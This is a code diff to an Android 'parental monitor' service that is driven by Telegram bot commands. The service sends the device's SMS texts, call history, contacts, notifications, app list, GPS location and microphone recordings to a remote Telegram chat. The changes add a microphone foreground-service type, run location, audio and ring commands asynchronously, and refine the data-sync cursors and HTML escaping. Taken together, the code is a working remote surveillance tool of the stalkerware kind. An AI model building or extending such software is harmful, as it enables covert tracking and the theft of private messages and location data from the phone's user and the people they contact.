@@ -13,6 +13,7 @@ import com.redeye.parentalmonitor.data.PreferencesManager
 import com.redeye.parentalmonitor.network.TelegramClient
 import com.redeye.parentalmonitor.network.TelegramMessage
 import com.redeye.parentalmonitor.utils.CrashReporter
+import com.redeye.parentalmonitor.utils.Html
 import com.redeye.parentalmonitor.utils.MessageScheduler
 import com.redeye.parentalmonitor.repository.CallLogRepository
 import com.redeye.parentalmonitor.repository.SmsRepository
@@ -107,18 +108,6 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun escapeHtml(text: String): String {
-        val out = StringBuilder(text.length + 16)
-        for (c in text) {
-            when (c) {
-                '&' -> out.append("&amp;")
-                '<' -> out.append("&lt;")
-                '>' -> out.append("&gt;")
-                else -> out.append(c)
-            }
-        }
-        return out.toString()
-    }
 
     private fun redactToken(value: String?): String {
         if (value.isNullOrEmpty()) return value ?: ""
@@ -167,6 +156,9 @@ class MonitoringService : Service() {
         var foregroundTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
         if (hasCameraPermission()) {
             foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+        }
+        if (hasMicPermission()) {
+            foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
         }
         if (hasLocationPermission() && hasBackgroundLocation()) {
             foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
@@ -228,6 +220,19 @@ class MonitoringService : Service() {
         }
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Monitoring loop started")
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
+        try {
+            messageQueue.tryRestorePersistent()
+        } catch (_: Exception) {
+        }
+        val stuckRing = preferencesManager.ringPrevVolume
+        if (stuckRing >= 0) {
+            try {
+                val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
+                audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, stuckRing, 0)
+            } catch (_: Exception) {
+            }
+            preferencesManager.ringPrevVolume = -1
+        }
         startCommandPolling()
         startLoopWatchdog()
         MessageScheduler.scheduleMessageSend(this)
@@ -649,11 +654,13 @@ class MonitoringService : Service() {
                     sendToTelegram("⚠️ Location permission missing. Open Setup and grant Location permission.")
                 } else {
                     sendToTelegram("📍 Locating…")
-                    val location = fetchLocation()
-                    if (location == null) {
-                        sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
-                    } else {
-                        sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m")
+                    serviceScope.launch {
+                        val location = fetchLocation()
+                        if (location == null) {
+                            sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
+                        } else {
+                            sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m")
+                    }
                     }
                 }
             }
@@ -780,7 +787,7 @@ class MonitoringService : Service() {
             }
             "/ring" -> {
                 val seconds = arg.toIntOrNull()?.coerceIn(5, 60) ?: 15
-                ringDevice(seconds)
+                serviceScope.launch { ringDevice(seconds) }
             }
             "/ping" -> {
                 if (sentAtSec > 0) {
@@ -798,7 +805,7 @@ class MonitoringService : Service() {
                     sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
                 } else {
                     sendToTelegram("\uD83C\uDF99\uFE0F Recording $seconds s\u2026")
-                    recordAndSendAudio(seconds)
+                    serviceScope.launch { recordAndSendAudio(seconds) }
                 }
             }
             "/sms" -> {
@@ -843,7 +850,7 @@ class MonitoringService : Service() {
                         buildString {
                             appendLine("\uD83D\uDD14 <b>Last notifications</b>")
                             for (item in items.takeLast(10)) {
-                                appendLine("\u2022 " + escapeHtml(item.app) + ": " + escapeHtml(item.title.take(80)) + " \u2014 " + escapeHtml(item.text.take(120)))
+                                appendLine("\u2022 " + Html.escape(item.app) + ": " + Html.escape(item.title.take(80)) + " \u2014 " + Html.escape(item.text.take(120)))
                             }
                         }
                     )
@@ -889,7 +896,7 @@ class MonitoringService : Service() {
                             buildString {
                                 appendLine("\uD83D\uDC64 <b>Contacts (${found.size})</b>")
                                 for (entry in found) {
-                                    appendLine("\u2022 " + escapeHtml(entry.first) + " \u2014 " + escapeHtml(entry.second))
+                                    appendLine("\u2022 " + Html.escape(entry.first) + " \u2014 " + Html.escape(entry.second))
                                 }
                             }
                         )
@@ -906,7 +913,7 @@ class MonitoringService : Service() {
                         buildString {
                             appendLine("\uD83D\uDCE6 <b>Apps (${apps.size})</b>")
                             for (label in apps) {
-                                appendLine("\u2022 " + escapeHtml(label))
+                                appendLine("\u2022 " + Html.escape(label))
                             }
                         }
                     )
@@ -928,12 +935,12 @@ class MonitoringService : Service() {
                     sendToTelegram("Usage: /history \u003cnomor\u003e")
                 } else {
                     val calls = try {
-                        callLogRepository.getAllCalls(200).filter { it.number.filter { c -> c.isDigit() }.contains(digits) }.take(5)
+                        callLogRepository.getCallsForNumber(digits, 50).filter { it.number.filter { c -> c.isDigit() }.contains(digits) }.take(5)
                     } catch (_: Exception) {
                         emptyList()
                     }
                     val sms = try {
-                        smsRepository.getRecentSms(100).filter { it.address.filter { c -> c.isDigit() }.contains(digits) }.take(5)
+                        smsRepository.getSmsForNumber(digits, 50).filter { it.address.filter { c -> c.isDigit() }.contains(digits) }.take(5)
                     } catch (_: Exception) {
                         emptyList()
                     }
@@ -1068,7 +1075,12 @@ class MonitoringService : Service() {
                     override fun onProviderEnabled(provider: String) {}
                 }
                 try {
-                    locationManager.requestSingleUpdate(chosen, listener, android.os.Looper.getMainLooper())
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                        locationManager.requestSingleUpdate(chosen, androidx.core.content.ContextCompat.getMainExecutor(this@MonitoringService), listener)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        locationManager.requestSingleUpdate(chosen, listener, android.os.Looper.getMainLooper())
+                    }
                 } catch (_: SecurityException) {
                     return@withContext null
                 }
@@ -1123,8 +1135,8 @@ class MonitoringService : Service() {
                         appendLine("💬 <b>SMS History - part ${index + 1}/${chunks.size}</b>")
                         appendLine()
                         chunk.forEach { sms ->
-                            appendLine("📞 Number: ${escapeHtml(sms.address)}")
-                            val body = escapeHtml(sms.body.take(200)) // Limit SMS body to 200 chars
+                            appendLine("📞 Number: ${Html.escape(sms.address)}")
+                            val body = Html.escape(sms.body.take(200)) // Limit SMS body to 200 chars
                             appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                             appendLine("🔄 Type: ${sms.getTypeString()}")
                             appendLine("⏰ Time: ${formatDate(sms.date)}")
@@ -1148,9 +1160,9 @@ class MonitoringService : Service() {
                         appendLine("📞 <b>Call History - part ${index + 1}/${chunks.size}</b>")
                         appendLine()
                         chunk.forEach { call ->
-                            appendLine("📱 Number: ${escapeHtml(call.number)}")
+                            appendLine("📱 Number: ${Html.escape(call.number)}")
                             if (call.name != null) {
-                                appendLine("👤 Name: ${escapeHtml(call.name)}")
+                                appendLine("👤 Name: ${Html.escape(call.name)}")
                             }
                             appendLine("🔄 Type: ${call.getTypeString()}")
                             appendLine("⏱️ Duration: ${call.getDurationString()}")
@@ -1201,33 +1213,29 @@ class MonitoringService : Service() {
     private suspend fun checkAndSendNewData() {
         if (initialSyncRunning.get()) return
         try {
-            var pages = 0
-            while (pages < 1) {
-                val page = smsRepository.getNewSms(preferencesManager.lastSmsId)
-                if (page.isEmpty()) break
-                val chunks = page.chunked(10)
+            val smsPage = smsRepository.getNewSms(preferencesManager.lastSmsId)
+            if (smsPage.isNotEmpty()) {
+                val chunks = smsPage.chunked(10)
                 chunks.forEachIndexed { index, chunk ->
                     sendFitted(formatSmsMessage(chunk))
-                    preferencesManager.lastSmsId = chunk.maxOf { it.id }
+                    preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, chunk.maxOf { it.id })
                     if (index < chunks.size - 1) delay(500)
                 }
-                if (page.size < 500) break
-                pages++
             }
-            pages = 0
-            while (pages < 1) {
-                val page = callLogRepository.getNewCalls(preferencesManager.lastCallTimestamp, preferencesManager.lastCallId)
-                if (page.isEmpty()) break
-                val chunks = page.chunked(10)
+            val callPage = callLogRepository.getNewCalls(preferencesManager.lastCallTimestamp, preferencesManager.lastCallId)
+            if (callPage.isNotEmpty()) {
+                val chunks = callPage.chunked(10)
                 chunks.forEachIndexed { index, chunk ->
                     sendFitted(formatCallMessage(chunk))
                     val latest = chunk.maxWith(compareBy({ it.date }, { it.id }))
-                    preferencesManager.lastCallTimestamp = latest.date
-                    preferencesManager.lastCallId = latest.id
+                    if (latest.date > preferencesManager.lastCallTimestamp ||
+                        (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                    ) {
+                        preferencesManager.lastCallTimestamp = latest.date
+                        preferencesManager.lastCallId = latest.id
+                    }
                     if (index < chunks.size - 1) delay(500)
                 }
-                if (page.size < 500) break
-                pages++
             }
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error checking new data", e)
@@ -1240,8 +1248,8 @@ class MonitoringService : Service() {
             appendLine()
             
             smsList.forEach { sms ->
-                appendLine("📞 Number: ${escapeHtml(sms.address)}")
-                val body = escapeHtml(sms.body.take(200)) // Limit to 200 chars
+                appendLine("📞 Number: ${Html.escape(sms.address)}")
+                val body = Html.escape(sms.body.take(200)) // Limit to 200 chars
                 appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                 appendLine("🔄 Type: ${sms.getTypeString()}")
                 appendLine("⏰ Time: ${formatDate(sms.date)}")
@@ -1256,9 +1264,9 @@ class MonitoringService : Service() {
             appendLine()
             
             callList.forEach { call ->
-                appendLine("📱 Number: ${escapeHtml(call.number)}")
+                appendLine("📱 Number: ${Html.escape(call.number)}")
                 if (call.name != null) {
-                    appendLine("👤 Name: ${escapeHtml(call.name)}")
+                    appendLine("👤 Name: ${Html.escape(call.name)}")
                 }
                 appendLine("🔄 Type: ${call.getTypeString()}")
                 appendLine("⏱️ Duration: ${call.getDurationString()}")
@@ -1559,6 +1567,13 @@ class MonitoringService : Service() {
         }
     }
 
+    private fun hasMicPermission(): Boolean {
+        return androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            android.Manifest.permission.RECORD_AUDIO
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
     private fun hasCameraPermission(): Boolean {
         return androidx.core.content.ContextCompat.checkSelfPermission(
             this,
@@ -1660,6 +1675,7 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
             -1
         }
+        preferencesManager.ringPrevVolume = previous
         var ringtone: android.media.Ringtone? = null
         try {
             try {
@@ -1683,6 +1699,7 @@ class MonitoringService : Service() {
                 if (previous >= 0) audioManager.setStreamVolume(stream, previous, 0)
             } catch (_: Exception) {
             }
+            preferencesManager.ringPrevVolume = -1
         }
     }
 
